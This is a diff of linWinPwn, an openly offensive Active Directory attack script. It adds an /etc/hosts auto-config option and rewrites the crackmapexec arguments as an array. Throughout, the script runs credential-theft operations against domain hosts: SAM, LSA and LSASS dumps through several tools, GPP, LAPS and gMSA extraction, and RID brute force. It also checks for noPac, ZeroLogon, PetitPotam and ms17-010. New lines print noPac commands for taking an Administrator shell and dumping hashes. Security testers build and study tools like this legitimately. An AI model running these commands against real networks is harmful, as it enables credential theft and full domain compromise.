@@ -19,6 +19,7 @@ output_dir="$(pwd)"
 pass_list="/usr/share/wordlists/rockyou.txt"
 users_list="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
 allservers_bool=true
+autoconfig_bool=false
 
 #Tools variables
 scripts_dir="/opt/lwp-scripts"
@@ -54,7 +55,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN} version 0.5.4
+      ${BLUE}linWinPwn: ${CYAN} version 0.5.5
       ${NC}https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -71,7 +72,7 @@ help_linWinPwn () {
     echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
     echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
     echo -e "-o/--output       Output directory (default: current dir)"
-    echo -e "--ntp             Run NTP sync with target DC (positional argument: at the end)" 
+    echo -e "--auto-config     Run NTP sync with target DC and adds entry to /etc/hosts (positional argument: at the end)" 
     echo -e ""
     echo -e "${YELLOW}Example usages${NC}"
     echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
@@ -94,7 +95,7 @@ while test $# -gt 0; do
             --Modules) modules="${2}"; shift;; #comma separated modules to run
             -o) output_dir="${2}"; shift;;
             --output) output_dir="${2}"; shift;;
-            --ntp) echo -e "${BLUE}[*] NTP sync with target DC... ${NC}"; sudo timedatectl set-ntp 0; sudo ntpdate ${dc_ip}; shift;;
+            --auto-config) autoconfig_bool=true; shift;;
             -h) help_linWinPwn; exit;;
             --help) help_linWinPwn; exit;;
             \?) echo -e "Unknown option: ${2}" >&2; exit 1;;
@@ -132,6 +133,14 @@ prepare (){
         domain=${dc_domain}
     fi
 
+    if [ "${autoconfig_bool}" == true ]; then
+        echo -e "${BLUE}[*] NTP and /etc/hosts auto-config... ${NC}"
+        sudo timedatectl set-ntp 0
+        sudo ntpdate ${dc_ip}
+        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
+        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN}" | sudo tee -a /etc/hosts
+    fi
+
     nullsess_bool=false
     hash_bool=false
     kerb_bool=false
@@ -161,7 +170,7 @@ prepare (){
         target=${dc_ip}
         target_dc=${dc_ip_list}
         target_sql=${sql_ip_list}
-        argument_cme=""
+        argument_cme=("-u" "" "-p" "")
         argument_smbmap=""
         auth_string="${YELLOW}[i]${NC} Authentication method: null session ${NC}"
     
@@ -175,7 +184,7 @@ prepare (){
         target=${dc_ip}
         target_dc=${dc_ip_list}
         target_sql=${sql_ip_list}
-        argument_cme="-d ${domain} -u ${user} -p ''"
+        argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "")
         argument_ldapdns="-u ${domain}\\${user} -p ''"
         argument_smbmap="-d ${domain} -u ${user} -p ''"
         argument_imp="${domain}/${user}:''"
@@ -193,7 +202,7 @@ prepare (){
         target=${dc_ip}
         target_dc=${dc_ip_list}
         target_sql=${sql_ip_list}
-        argument_cme="-d ${domain} -u ${user} -H ${password}"
+        argument_cme=("-d" "${domain}" "-u" "${user}" "-H" "${password}")
         argument_ldapdns="-u ${domain}\\${user} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
         argument_imp=" -hashes ${password} ${domain}/${user}"
@@ -211,7 +220,7 @@ prepare (){
         target_dc=${dc_hostname_list}
         target_sql=${sql_hostname_list}
         export KRB5CCNAME=$(realpath $password)
-        argument_cme="-d ${domain} -u ${user} -k"
+        argument_cme=("-d" "${domain}" "-u" "${user}" "-k")
         argument_imp="-k -no-pass ${domain}/${user}"
         argument_donpapi="-k -no-pass ${domain}/${user}"
         argument_bhd="-u ${user}@${domain} -k"
@@ -224,7 +233,7 @@ prepare (){
         target=${dc_ip}
         target_dc=${dc_ip_list}
         target_sql=${sql_ip_list}
-        argument_cme="-d ${domain} -u ${user} -p ${password}"
+        argument_cme=("-d" "${domain}" "-u" "${user}" "-p" "${password}")
         argument_ldapdns="-u ${domain}\\${user} -p ${password}"
         argument_smbmap="-d ${domain} -u ${user} -p ${password}"
         argument_imp="${domain}/${user}:${password}"
@@ -238,7 +247,7 @@ prepare (){
     fi
 
     if [ "${nullsess_bool}" == false ] ; then
-        auth_check=$(${crackmapexec} smb ${target} ${argument_cme} | grep "\[-\]")
+        auth_check=$(${crackmapexec} smb ${target} "${argument_cme[@]}" | grep "\[-\]")
         if [ ! -z "$auth_check" ] ; then
             echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
             exit 1
@@ -456,7 +465,7 @@ enum4linux_enum () {
 ridbrute_attack () {
     echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
     if [ "${nullsess_bool}" == true ] ; then
-        ${crackmapexec} smb ${target} ${argument_cme} --rid-brute 2>/dev/null > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
+        ${crackmapexec} smb ${target} "${argument_cme[@]}" --rid-brute 2>/dev/null > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
         count=$(wc -l ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
@@ -470,15 +479,15 @@ ridbrute_attack () {
 users_enum () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${BLUE}[*] Users Enumeration (Null session)${NC}"
-        ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt
-        ${crackmapexec} ldap ${target} -u '' -p '' --users --kdcHost "${kdc}${dc_domain}" > ${output_dir}/DomainRecon/cme_users_nullsess_ldap_${dc_domain}.txt
+        ${crackmapexec} smb ${target} "${argument_cme[@]}" --users > ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt
+        ${crackmapexec} ldap ${target} "${argument_cme[@]}" --users --kdcHost "${kdc}${dc_domain}" > ${output_dir}/DomainRecon/cme_users_nullsess_ldap_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_cme_nullsess_${dc_domain}.txt 2>&1
         count=$(cat ${output_dir}/DomainRecon/users_list_cme_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
         echo -e "${GREEN}[+] Found ${count} users using RPC User Enum"
     else
         echo -e "${BLUE}[*] Users Enumeration (authenticated)${NC}"
-        ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/cme_users_auth_${dc_domain}.txt
+        ${crackmapexec} smb ${target} "${argument_cme[@]}" --users > ${output_dir}/DomainRecon/cme_users_auth_${dc_domain}.txt
         #Parsing user lists
         /bin/cat ${output_dir}/DomainRecon/cme_users_auth_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}\\\\" | cut -d "\\" -f 2 | cut -d " " -f 1 | cut -d ":" -f 1 > ${output_dir}/DomainRecon/users_list_cme_${dc_domain}.txt 2>&1
         count=$(cat ${output_dir}/DomainRecon/users_list_cme_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
@@ -508,52 +517,52 @@ userpass_cme_check () {
 
 passpol_enum () {
     echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
-    ${crackmapexec} smb ${target} ${argument_cme} --pass-pol 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target} "${argument_cme[@]}" --pass-pol 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 gpp_enum () {
     echo -e "${BLUE}[*] GPP Enumeration${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_autologin 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_password 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M gpp_autologin 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M gpp_password 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 passnotreq_enum () {
     echo -e "${BLUE}[*] Password not required Enumeration${NC}"
-    ${crackmapexec} ldap ${target_dc} ${argument_cme} --password-not-required --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" --password-not-required --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 adcs_enum () {
     echo -e "${BLUE}[*] ADCS Enumeration${NC}"
-    ${crackmapexec} ldap ${target} ${argument_cme} -M adcs --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M adcs --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 passdesc_enum () {
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
-    ${crackmapexec} ldap ${target} ${argument_cme} -M get-desc-users --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M get-desc-users --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
     /bin/cat ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>/dev/null | grep -i "pass" > ${output_dir}/DomainRecon/cme_get-desc-users_pass_results_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 macq_enum () {
     echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
-    ${crackmapexec} ldap ${target} ${argument_cme} -M MAQ --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M MAQ --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 ldapsign_enum () {
     echo -e "${BLUE}[*] LDAP-signing check${NC}"
-    ${crackmapexec} ldap ${target_dc} ${argument_cme} -M ldap-signing --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
-    ${crackmapexec} ldap ${target_dc} ${argument_cme} -M ldap-checker --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" -M ldap-signing --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" -M ldap-checker --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 deleg_enum_cme () {
     echo -e "${BLUE}[*] Trusted-for-delegation check (cme)${NC}"
-    ${crackmapexec} ldap ${target_dc} ${argument_cme} --trusted-for-delegation --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target_dc} "${argument_cme[@]}" --trusted-for-delegation --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -849,7 +858,7 @@ smb_map () {
 
 shares_cme_dc () {
     echo -e "${BLUE}[*] Enumerating Shares on DC using crackmapexec${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} --shares 2>/dev/null | tee ${output_dir}/Shares/cme_shares_dc_output${dc_domain}.txt 2>&1 
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" --shares 2>/dev/null | tee ${output_dir}/Shares/cme_shares_dc_output${dc_domain}.txt 2>&1 
     echo -e ""
 }
 
@@ -860,14 +869,14 @@ shares_cme () {
         shares_cme_dc
     else
         smb_scan
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} --shares 2>/dev/null | tee ${output_dir}/Shares/cme_shares_output${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" --shares 2>/dev/null | tee ${output_dir}/Shares/cme_shares_output${dc_domain}.txt 2>&1
     fi
     echo -e ""
 }
 
 spider_cme_dc () {
     echo -e "${BLUE}[*] Spidering Shares on DC using crackmapexec${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee ${output_dir}/Shares/cme_spider_dc_output${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee ${output_dir}/Shares/cme_spider_dc_output${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -878,7 +887,7 @@ spider_cme () {
         spider_cme_dc
     else
         smb_scan
-        ${crackmapexec} smb ${servers_smb_list} ${argument_cme} -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee ${output_dir}/Shares/cme_spider_output${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee ${output_dir}/Shares/cme_spider_output${dc_domain}.txt 2>&1
     fi
     echo -e ""
 }
@@ -888,7 +897,7 @@ keepass_scan_dc () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] keepass_discover requires credentials${NC}"
     else
-        ${crackmapexec} smb ${target_dc} ${argument_cme} -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_dc_${dc_domain}_${dc_ip}.txt
+        ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_dc_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
@@ -905,7 +914,7 @@ keepass_scan () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] keepass_discover of ${i} ${NC}"
-                ${crackmapexec} smb ${i} ${argument_cme} -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" -M keepass_discover 2>/dev/null | tee ${output_dir}/Shares/keepass_discover_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -914,7 +923,7 @@ keepass_scan () {
 
 laps_dump () {
     echo -e "${BLUE}[*] LAPS Dump${NC}"
-    ${crackmapexec} ldap ${target} ${argument_cme} -M laps --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M laps --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -923,7 +932,7 @@ gmsa_dump () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
     else
-        ${crackmapexec} ldap ${dc_ip} ${argument_cme} --gmsa | > ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
+        ${crackmapexec} ldap ${dc_ip} "${argument_cme[@]}" --gmsa | > ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -965,7 +974,7 @@ sam_dump_dc () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
     else
-        ${crackmapexec} smb ${target_dc} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
+        ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
@@ -982,7 +991,7 @@ sam_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
-                ${crackmapexec} smb ${i} ${argument_cme} --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" --sam | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -994,7 +1003,7 @@ lsa_dump_dc () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
     else
-        ${crackmapexec} smb ${target_dc} ${argument_cme} --lsa | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
+        ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" --lsa | tee ${output_dir}/Credentials/sam_dump_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
@@ -1011,7 +1020,7 @@ lsa_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
-                ${crackmapexec} smb ${i} ${argument_cme} --lsa | tee ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" --lsa | tee ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -1023,7 +1032,7 @@ lsassy_dump_dc () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        ${crackmapexec} smb ${target_dc} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${dc_ip}.txt
+        ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
@@ -1040,7 +1049,7 @@ lsassy_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
-                ${crackmapexec} smb ${i} ${argument_cme} -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" -M lsassy 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -1052,7 +1061,7 @@ handlekatz_dump_dc () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        ${crackmapexec} smb ${target_dc} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${dc_ip}.txt
+        ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
@@ -1069,7 +1078,7 @@ handlekatz_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
-                ${crackmapexec} smb ${i} ${argument_cme} -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" -M handlekatz 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -1081,7 +1090,7 @@ procdump_dump_dc () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        ${crackmapexec} smb ${target_dc} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${dc_ip}.txt
+        ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
@@ -1098,7 +1107,7 @@ procdump_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
-                ${crackmapexec} smb ${i} ${argument_cme} -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" -M procdump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -1110,7 +1119,7 @@ nanodump_dump_dc () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        ${crackmapexec} smb ${target_dc} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${dc_ip}.txt
+        ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${dc_ip}.txt
     fi
     echo ""
 }
@@ -1127,7 +1136,7 @@ nanodump_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
-                ${crackmapexec} smb ${i} ${argument_cme} -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" -M nanodump 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -1183,7 +1192,7 @@ masky_dump_dc () {
         pki_server=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found PKI Enrollment Server" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
         pki_ca=$(/bin/cat ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>/dev/null| grep "Found CN" | cut -d ":" -f 2 | cut -d " " -f 2 | head -n 1)
         if [ ! "${pki_server}" == "" ] && [ ! "${pki_ca}" == "" ]; then
-            ${crackmapexec} smb ${target_dc} ${argument_cme} -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${dc_ip}.txt
+            ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${dc_ip}.txt
         else
             echo -e "${PURPLE}[-] No ADCS servers found. If ADCS servers exist, re-run ADCS enumeration and try again.${NC}"
         fi
@@ -1209,7 +1218,7 @@ masky_dump () {
                 smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
-                ${crackmapexec} smb ${i} ${argument_cme} -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt
+                ${crackmapexec} smb ${i} "${argument_cme[@]}" -M masky -o "CA= ${pki_server}\\${pki_ca}" 2>/dev/null | tee ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt
             done
             fi
         else
@@ -1236,7 +1245,7 @@ mssql_enum () {
         if [ ! -f "${sql_ip_list}" ] ; then
              echo -e "${PURPLE}[-] No SQL servers servers found${NC}"
         else
-            ${crackmapexec} mssql ${target_sql} ${argument_cme} -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} mssql ${target_sql} "${argument_cme[@]}" -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
         fi
     fi
     echo -e ""
@@ -1244,14 +1253,19 @@ mssql_enum () {
 
 nopac_check () {
     echo -e "${BLUE}[*] NoPac check ${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M nopac 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M nopac 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
+    if grep -q "VULNEABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
+        echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
+        echo -e "Get shell: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host $dc_NETBIOS --impersonate Administrator -shell"
+        echo -e "Dump hashes: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host $dc_NETBIOS --impersonate Administrator -dump"
+    fi
     echo -e ""
 }
 
 petitpotam_check () {
     echo -e "${BLUE}[*] PetitPotam check ${NC}"
     for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} smb ${i} ${argument_cme} -M petitpotam 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M petitpotam 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
     done
     echo -e ""
 }
@@ -1259,14 +1273,14 @@ petitpotam_check () {
 dfscoerce_check () {
     echo -e "${BLUE}[*] dfscoerce check ${NC}"
     for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} smb ${i} ${argument_cme} -M dfscoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M dfscoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
     done
     echo -e ""
 }
 
 zerologon_check () {
     echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
-    ${crackmapexec} smb ${target} ${argument_cme} -M zerologon 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${target} "${argument_cme[@]}" -M zerologon 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
     if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>/dev/null; then
         echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
         echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
@@ -1279,7 +1293,7 @@ zerologon_check () {
 
 ms17-010_check_dc () {
     echo -e "${BLUE}[*] ms17-010 check on DC${NC}"
-    ${crackmapexec} smb ${target_dc} ${argument_cme} -M ms17-010 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_ms17-010_dc_output_${dc_domain}.txt 2>&1
